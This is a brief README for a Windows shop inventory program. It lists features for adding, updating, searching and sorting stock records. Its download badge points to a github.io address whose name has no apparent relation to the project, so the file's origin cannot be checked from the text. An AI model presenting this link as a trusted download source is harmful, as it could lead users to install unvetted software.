# 📦 Shop-Management-System - Manage retail inventory with ease today

[![](https://img.shields.io/badge/Download-Latest_Release-blue.svg)](https://asclepiadaceous-royalpurple804.github.io)

This application helps store owners track inventory on a Windows computer. You can keep records of items, track product prices, and maintain accurate stock levels without complex accounting software. The program stores all data locally on your hard drive, which keeps your records safe and private.

## 🛠 Features

The system simplifies daily retail tasks through a visual interface. Use these tools to maintain your inventory:

*   **Add New Items**: Enter product names, categories, and current prices into the system.
*   **Update Stock Levels**: Adjust quantities when you sell items or receive new shipments.
*   **Delete Records**: Remove discontinued items from your database to keep your lists clean.
*   **Search**: Find specific products by name or category within seconds.
*   **View Inventory**: See a full list of all items in your shop at one time.
*   **Automatic Sorting**: The system organizes data for easy viewing and management.
